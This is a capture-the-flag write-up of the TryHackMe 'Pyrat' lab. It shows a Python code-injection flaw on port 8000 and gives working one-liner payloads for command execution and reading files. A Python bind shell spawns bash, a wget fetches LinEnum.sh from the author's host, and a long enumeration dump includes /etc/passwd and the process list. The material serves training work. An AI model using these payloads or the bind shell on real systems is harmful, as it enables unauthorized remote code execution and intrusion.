# Room: Pyrat (TryHackMe)

<p align="center">
    <img src="https://tryhackme-badges.s3.amazonaws.com/J4ck3LSyN.png" alt="Your Image Badge" />
</p>

## Notes:
- The vuln is on connection, due to improper handling of the request headers `GET`, `POST`, ... 
- Exploiting this is takes a little python fuckery to get working, however it is simple.

## Methodology

_Host:_ `<host>`

1. NMAP Scan
    1. `sudo nmap -vv -sV -sC -O -T5 -oN init.nmap <host>`
    2. Identify:
        - Port: 22 (SSH)
        - Port: 8000 (Python Simple HTTP Server) Version 0.6 Python 3.11
    ```markdown
    PORT     STATE SERVICE  REASON         VERSION
    22/tcp   open  ssh      syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 0a:5b:f1:f3:1a:50:ab:bd:1f:1e:71:8b:cd:9a:0d:10 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0m3/zWB4/AVcVlsS+BQzhKi9jwPRJFtY5t4EXItwdw2Dp0lyAn/K6lwuyP1LpIjTABxlhMbQCZ2hNkUyoA3d8GdGaNqLnuy8kDKxXT2TERpPqtNQaDruG+jvbd1bE628o47VUjHkE4V++12cPXer1er/t8gFDMOY9cyJGmiqFaKdAMJvjTDkx8t0Jq3NMkKSe4yIHQ/uJrkyEaGW5ZeFX0k7WKZWHp8hTglfhlNuj+hvWdLkqUO073RkkcyxUjWhd8O9l+2/tIoELDWc4VhCuJdkD2rTGXTaD0PLsiDl2KKljXLSP4pvN4R/m+UZaClHvtFb+a9/WIzPc4jcuBaf11JEoJs2am4nQcoLbcibkd9sHIq/1nwJKRFe8JbhphECu6P0GcyOhdOFDW1CZjPo7eSIwsUxcgTfAg3uxmqEcX8BauKvltFse9x2UwDy44uxYpCT1w0UYpeyLYeIU8vG5KGvUv1Tn6jts48bumHQC6xxRvw5HRRAwr8lmjoLk6Uk=
    |   256 45:13:bf:d2:c0:c9:c9:fb:bc:96:78:37:24:7d:63:d7 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG57YgqLmGaHqqDrwnRYbkXKaZenfRykhNlEHC/U6BoYuEvVWYsbS8TvhgJoKaQQfVhL4roSHhf+0UWYg8GBvII0=
    |   256 bb:03:25:fe:e2:8b:22:04:1c:ca:ad:6f:ef:21:d2:10 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIb+oxRhFjLL8x/Do1wfgDt+73S8UQAQkp/x5mxkBfPm
    8000/tcp open  http-alt syn-ack ttl 62 SimpleHTTP/0.6 Python/3.11.2
    |_http-server-header: SimpleHTTP/0.6 Python/3.11.2
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
    |     source code string cannot contain null bytes
    |   FourOhFourRequest, LPDString, SIPOptions: 
    |     invalid syntax (<string>, line 1)
    |   GetRequest: 
    |     name 'GET' is not defined
    |   HTTPOptions, RTSPRequest: 
    |     name 'OPTIONS' is not defined
    |   Help: 
    |_    name 'HELP' is not defined
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-favicon: Unknown favicon MD5: FBD3DB4BEF1D598ED90E26610F23A63F
    ```
2. fuzz the domain.
    - Results in nothing, has text on the landing page: `Try a more basic connection`
3. nc to the domain `nc 10.67.158.45 8000`
4. pass a command `test` and `name 'ls' is not defined`.
    - This indeicated a `NameError` inside of the python interpreter.
    - Identified `os` existance allowing for `os.system`.
    

### Payloads

> _Note:_ While I am aware that a Reverse/Bind/PHP/HTA shell(s) would be optimal, for my own personal growth, I am going to keep my initial payloads under direct-execution manually. For the most part, or untilI feel satisifed with my manual operations.

__Initial Subprocess Popen Exec__

`a=__import__('subprocess');out=a.Popen([''],shell=True,stdout=a.PIPE,stderr=a.STDOUT).communicate()[0].decode();print(out)`

__Simple Directory Enum__ 

`b=__import__('os');print(b.listdir('/opt/dev/.git'))`
    

__Multiple File Reading__

```python
[print(i) for i in open('/var/log/auth.log.1','r').read().split('\n')]
```

__Bind Shell (Python)__

```python
s=__import__('socket');o=__import__('os');p=__import__('subprocess');sock=s.socket(s.AF_INET,s.SOCK_STREAM);sock.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);sock.bind(("0.0.0.0",65219));sock.listen(1);c,a=sock.accept();o.dup2(c.fileno(),0);o.dup2(c.fileno(),1);o.dup2(c.fileno(),2);p.call(["/bin/bash","-i"])
```
### Post Bind Shell
1. LinEnum
```markdown
nc 10.67.130.81 65221
bash: cannot set terminal process group (735): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
www-data@ip-10-67-130-81:~$ cd /tmp     
cd /tmp
www-data@ip-10-67-130-81:/tmp$ wget http://192.168.184.209:8000/LinEnum.sh
wget http://192.168.184.209:8000/LinEnum.sh
--2025-12-28 21:28:55--  http://192.168.184.209:8000/LinEnum.sh
Connecting to 192.168.184.209:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

     0K .......... .......... .......... .......... .....     100%  142K=0.3s

2025-12-28 21:28:56 (142 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

www-data@ip-10-67-130-81:/tmp$ ls
ls
LinEnum.sh
pymp-w1t9d75k
systemd-private-f76eb1f4d60b4b72bce5bc9cb2e5abb5-ModemManager.service-VGkMtf
systemd-private-f76eb1f4d60b4b72bce5bc9cb2e5abb5-systemd-logind.service-Fe7t9g
systemd-private-f76eb1f4d60b4b72bce5bc9cb2e5abb5-systemd-resolved.service-BwFuqi
systemd-private-f76eb1f4d60b4b72bce5bc9cb2e5abb5-systemd-timesyncd.service-s3gkng
www-data@ip-10-67-130-81:/tmp$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
www-data@ip-10-67-130-81:/tmp$ ./LinEnum.sh > .linlog
./LinEnum.sh > .linlog
www-data@ip-10-67-130-81:/tmp$ cat .linlog  	
cat .linlog

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sun 28 Dec 2025 09:29:41 PM UTC


### SYSTEM ##############################################
[-] Kernel information:
Linux ip-10-67-130-81 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 5.15.0-138-generic (buildd@lcy02-amd64-117) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.6 LTS"
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal


[-] Hostname:
ip-10-67-130-81


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             pts/0    10.23.8.228      Sun May 25 10:01:29 +0000 2025
think            pts/1    192.168.204.1    Thu Jun 15 12:09:31 +0000 2023


[-] Who else is logged on:
 21:29:41 up 13 min,  0 users,  load average: 0.08, 0.06, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon) groups=1(daemon)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
uid=998(lxd) gid=100(users) groups=100(users)
uid=1000(think) gid=1000(think) groups=1000(think)
uid=113(fwupd-refresh) gid=117(fwupd-refresh) groups=117(fwupd-refresh)
uid=114(postfix) gid=119(postfix) groups=119(postfix)
uid=1001(ubuntu) gid=1002(ubuntu) groups=1002(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(lxd),1001(netdev)


[-] It looks like we have some admin users:
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=1001(ubuntu) gid=1002(ubuntu) groups=1002(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(lxd),1001(netdev)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
postfix:x:114:119::/var/spool/postfix:/usr/sbin/nologin
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root   root   4.0K Dec 28 21:17 .
drwxr-xr-x 18 root   root   4.0K Dec 28 21:17 ..
drwxr-x---  5 think  think  4.0K Jun 21  2023 think
drwxr-xr-x  3 ubuntu ubuntu 4.0K Dec 28 21:17 ubuntu


### ENVIRONMENTAL #######################################
[-] Environment information:
SHELL=/bin/sh
PWD=/tmp
LOGNAME=root
HOME=/root
LANG=en_US.UTF-8
SHLVL=1
PATH=/usr/bin:/bin
OLDPWD=/root
_=/usr/bin/env


[-] Path information:
/usr/bin:/bin
lrwxrwxrwx 1 root root     7 Feb 23  2022 /bin -> usr/bin
drwxr-xr-x 2 root root 36864 May 25  2025 /usr/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root 1042 Jun 15  2023 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x   2 root root 4096 Apr 27  2025 .
drwxr-xr-x 106 root root 4096 Dec 28 21:17 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  191 Feb 23  2022 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x   2 root root 4096 Apr 27  2025 .
drwxr-xr-x 106 root root 4096 Dec 28 21:17 ..
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 May 14  2021 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Feb 23  2022 .
drwxr-xr-x 106 root root 4096 Dec 28 21:17 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb 23  2022 .
drwxr-xr-x 106 root root 4096 Dec 28 21:17 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Apr 27  2025 .
drwxr-xr-x 106 root root 4096 Dec 28 21:17 ..
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  403 Aug  5  2021 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Systemd timers:
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                     
Sun 2025-12-28 21:31:40 UTC 1min 54s left n/a                         n/a                  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2025-12-28 23:48:10 UTC 2h 18min left Sun 2025-04-27 06:14:00 UTC 8 months 2 days ago  fwupd-refresh.timer          fwupd-refresh.service         
Mon 2025-12-29 00:00:00 UTC 2h 30min left Sun 2025-12-28 21:17:29 UTC 12min ago            fstrim.timer                 fstrim.service                
Mon 2025-12-29 00:00:00 UTC 2h 30min left Sun 2025-12-28 21:17:29 UTC 12min ago            logrotate.timer              logrotate.service             
Mon 2025-12-29 00:00:00 UTC 2h 30min left Sun 2025-12-28 21:17:29 UTC 12min ago            man-db.timer                 man-db.service                
Mon 2025-12-29 01:37:21 UTC 4h 7min left  Fri 2023-12-22 13:00:53 UTC 2 years 0 months ago motd-news.timer              motd-news.service             
Mon 2025-12-29 06:07:57 UTC 8h left       Fri 2023-12-22 12:55:46 UTC 2 years 0 months ago apt-daily.timer              apt-daily.service             
Mon 2025-12-29 06:12:38 UTC 8h left       Sun 2025-12-28 21:21:41 UTC 8min ago             apt-daily-upgrade.timer      apt-daily-upgrade.service     
Sun 2026-01-04 03:10:04 UTC 6 days left   Sun 2025-12-28 21:17:29 UTC 12min ago            e2scrub_all.timer            e2scrub_all.service           

9 timers listed.
Enable thorough tests to see inactive timers


### NETWORKING  ##########################################
[-] Network and IP info:
ens5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.67.130.81  netmask 255.255.192.0  broadcast 10.67.191.255
        inet6 fe80::10fa:d6ff:fe61:ccad  prefixlen 64  scopeid 0x20<link>
        ether 12:fa:d6:61:cc:ad  txqueuelen 1000  (Ethernet)
        RX packets 11358  bytes 14763544 (14.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2010  bytes 1240328 (1.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 364  bytes 33374 (33.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 364  bytes 33374 (33.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


[-] ARP history:
10.67.188.169 dev ens5 lladdr 12:02:bc:fa:b7:3d STALE
10.67.128.1 dev ens5 lladdr 12:18:52:dd:3c:f5 REACHABLE


[-] Nameserver(s):
nameserver 127.0.0.53


[-] Nameserver(s):
Global
       LLMNR setting: no                  
MulticastDNS setting: no                  
  DNSOverTLS setting: no                  
      DNSSEC setting: no                  
    DNSSEC supported: no                  
          DNSSEC NTA: 10.in-addr.arpa     
                      16.172.in-addr.arpa 
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa 
                      18.172.in-addr.arpa 
                      19.172.in-addr.arpa 
                      20.172.in-addr.arpa 
                      21.172.in-addr.arpa 
                      22.172.in-addr.arpa 
                      23.172.in-addr.arpa 
                      24.172.in-addr.arpa 
                      25.172.in-addr.arpa 
                      26.172.in-addr.arpa 
                      27.172.in-addr.arpa 
                      28.172.in-addr.arpa 
                      29.172.in-addr.arpa 
                      30.172.in-addr.arpa 
                      31.172.in-addr.arpa 
                      corp                
                      d.f.ip6.arpa        
                      home                
                      internal            
                      intranet            
                      lan                 
                      local               
                      private             
                      test                

Link 2 (ens5)
      Current Scopes: DNS         
DefaultRoute setting: yes         
       LLMNR setting: yes         
MulticastDNS setting: no          
  DNSOverTLS setting: no          
      DNSSEC setting: no          
    DNSSEC supported: no          
  Current DNS Server: 10.67.0.2   
         DNS Servers: 10.67.0.2   
          DNS Domain: ec2.internal


[-] Default route:
default via 10.67.128.1 dev ens5 proto dhcp src 10.67.130.81 metric 100 


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:65221           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.67.130.81:68         0.0.0.0:*                           -                   


### SERVICES #############################################
[-] Running processes:
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.3  0.6 103852 12804 ?        Ss   21:16   0:02 /sbin/init auto automatic-ubiquity noprompt
root           2  0.0  0.0      0     0 ?        S    21:16   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   21:16   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   21:16   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   21:16   0:00 [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   21:16   0:00 [netns]
root           8  0.0  0.0      0     0 ?        I<   21:16   0:00 [kworker/0:0H-events_highpri]
root          10  0.0  0.0      0     0 ?        I<   21:16   0:00 [mm_percpu_wq]
root          11  0.0  0.0      0     0 ?        S    21:16   0:00 [rcu_tasks_rude_]
root          12  0.0  0.0      0     0 ?        S    21:16   0:00 [rcu_tasks_trace]
root          13  0.0  0.0      0     0 ?        S    21:16   0:00 [ksoftirqd/0]
root          14  0.0  0.0      0     0 ?        I    21:16   0:00 [rcu_sched]
root          15  0.0  0.0      0     0 ?        S    21:16   0:00 [migration/0]
root          16  0.0  0.0      0     0 ?        S    21:16   0:00 [idle_inject/0]
root          17  0.0  0.0      0     0 ?        I    21:16   0:00 [kworker/0:1-events]
root          18  0.0  0.0      0     0 ?        S    21:16   0:00 [cpuhp/0]
root          19  0.0  0.0      0     0 ?        S    21:16   0:00 [cpuhp/1]
root          20  0.0  0.0      0     0 ?        S    21:16   0:00 [idle_inject/1]
root          21  0.0  0.0      0     0 ?        S    21:16   0:00 [migration/1]
root          22  0.0  0.0      0     0 ?        S    21:16   0:00 [ksoftirqd/1]
root          24  0.0  0.0      0     0 ?        I<   21:16   0:00 [kworker/1:0H-events_highpri]
root          25  0.0  0.0      0     0 ?        S    21:16   0:00 [kdevtmpfs]
root          26  0.0  0.0      0     0 ?        I<   21:16   0:00 [inet_frag_wq]
root          27  0.0  0.0      0     0 ?        S    21:16   0:00 [kauditd]
root          28  0.0  0.0      0     0 ?        I    21:16   0:00 [kworker/1:1-events]
root          29  0.0  0.0      0     0 ?        S    21:16   0:00 [khungtaskd]
root          30  0.0  0.0      0     0 ?        S    21:16   0:00 [oom_reaper]
root          31  0.0  0.0      0     0 ?        I<   21:16   0:00 [writeback]
root          32  0.0  0.0      0     0 ?        S    21:16   0:00 [kcompactd0]
root          33  0.0  0.0      0     0 ?        SN   21:16   0:00 [ksmd]
root          34  0.0  0.0      0     0 ?        SN   21:16   0:00 [khugepaged]
root          80  0.0  0.0      0     0 ?        I<   21:16   0:00 [kintegrityd]
root          81  0.0  0.0      0     0 ?        I<   21:16   0:00 [kblockd]
root          82  0.0  0.0      0     0 ?        I<   21:16   0:00 [blkcg_punt_bio]
root          83  0.0  0.0      0     0 ?        I<   21:16   0:00 [tpm_dev_wq]
root          84  0.0  0.0      0     0 ?        I<   21:16   0:00 [ata_sff]
root          85  0.0  0.0      0     0 ?        I<   21:16   0:00 [md]
root          86  0.0  0.0      0     0 ?        I<   21:16   0:00 [edac-poller]
root          87  0.0  0.0      0     0 ?        I<   21:16   0:00 [devfreq_wq]
root          88  0.0  0.0      0     0 ?        S    21:16   0:00 [watchdogd]
root          90  0.0  0.0      0     0 ?        I<   21:16   0:00 [kworker/0:1H-kblockd]
root          92  0.0  0.0      0     0 ?        S    21:16   0:00 [kswapd0]
root          93  0.0  0.0      0     0 ?        S    21:16   0:00 [ecryptfs-kthrea]
root          95  0.0  0.0      0     0 ?        I<   21:16   0:00 [kthrotld]
root          96  0.0  0.0      0     0 ?        I<   21:16   0:00 [acpi_thermal_pm]
root          97  0.0  0.0      0     0 ?        I    21:16   0:00 [kworker/u4:2-events_power_efficient]
root          98  0.0  0.0      0     0 ?        I<   21:16   0:00 [vfio-irqfd-clea]
root          99  0.0  0.0      0     0 ?        I<   21:16   0:00 [mld]
root         100  0.0  0.0      0     0 ?        I<   21:16   0:00 [kworker/1:1H-kblockd]
root         101  0.0  0.0      0     0 ?        I<   21:16   0:00 [ipv6_addrconf]
root         102  0.0  0.0      0     0 ?        D    21:16   0:00 [kworker/1:2+events]
root         111  0.0  0.0      0     0 ?        I<   21:16   0:00 [kstrp]
root         114  0.0  0.0      0     0 ?        I<   21:16   0:00 [zswap-shrink]
root         115  0.0  0.0      0     0 ?        I<   21:16   0:00 [kworker/u5:0]
root         120  0.0  0.0      0     0 ?        I<   21:16   0:00 [charger_manager]
root         167  0.0  0.0      0     0 ?        I<   21:16   0:00 [nvme-wq]
root         168  0.0  0.0      0     0 ?        I<   21:16   0:00 [ena]
root         169  0.0  0.0      0     0 ?        I<   21:16   0:00 [cryptd]
root         172  0.0  0.0      0     0 ?        I<   21:16   0:00 [nvme-reset-wq]
root         174  0.0  0.0      0     0 ?        I<   21:16   0:00 [nvme-delete-wq]
root         224  0.0  0.0      0     0 ?        I<   21:16   0:00 [kdmflush]
root         225  0.0  0.0      0     0 ?        I<   21:16   0:00 [kdmflush]
root         261  0.0  0.0      0     0 ?        I<   21:16   0:00 [raid5wq]
root         323  0.0  0.0      0     0 ?        S    21:16   0:00 [jbd2/dm-0-8]
root         324  0.0  0.0      0     0 ?        I<   21:16   0:00 [ext4-rsv-conver]
root         401  0.1  0.4  32548  8988 ?        S<s  21:17   0:00 /lib/systemd/systemd-journald
root         425  0.0  0.0      0     0 ?        I    21:17   0:00 [kworker/0:3-events]
root         439  0.0  0.3  23212  6320 ?        Ss   21:17   0:00 /lib/systemd/systemd-udevd
root         528  0.0  0.0      0     0 ?        I<   21:17   0:00 [kaluad]
root         529  0.0  0.0      0     0 ?        I<   21:17   0:00 [kmpath_rdacd]
root         530  0.0  0.0      0     0 ?        I<   21:17   0:00 [kmpathd]
root         531  0.0  0.0      0     0 ?        I<   21:17   0:00 [kmpath_handlerd]
root         532  0.0  0.9 280144 17952 ?        SLsl 21:17   0:00 /sbin/multipathd -d -s
root         545  0.0  0.0      0     0 ?        S    21:17   0:00 [jbd2/nvme0n1p2-]
root         546  0.0  0.0      0     0 ?        I<   21:17   0:00 [ext4-rsv-conver]
systemd+     559  0.0  0.3  90896  6092 ?        Ssl  21:17   0:00 /lib/systemd/systemd-timesyncd
systemd+     610  0.0  0.3  27416  7692 ?        Ss   21:17   0:00 /lib/systemd/systemd-networkd
systemd+     612  0.0  0.6  25492 13068 ?        Ss   21:17   0:00 /lib/systemd/systemd-resolved
root         666  0.0  0.3 235580  7164 ?        Ssl  21:17   0:00 /usr/lib/accountsservice/accounts-daemon
root         667  0.0  0.9 1758084 17924 ?       Ssl  21:17   0:00 /usr/bin/amazon-ssm-agent
message+     669  0.0  0.2   7584  4756 ?        Ss   21:17   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         674  0.0  0.1  81836  3740 ?        Ssl  21:17   0:00 /usr/sbin/irqbalance --foreground
root         675  0.0  0.9  29676 18564 ?        Ss   21:17   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         679  0.0  0.1   6824  2760 ?        Ss   21:17   0:00 /usr/sbin/cron -f
root         680  0.0  0.3 232740  6872 ?        Ssl  21:17   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       686  0.0  0.2 224500  5240 ?        Ssl  21:17   0:00 /usr/sbin/rsyslogd -n -iNONE
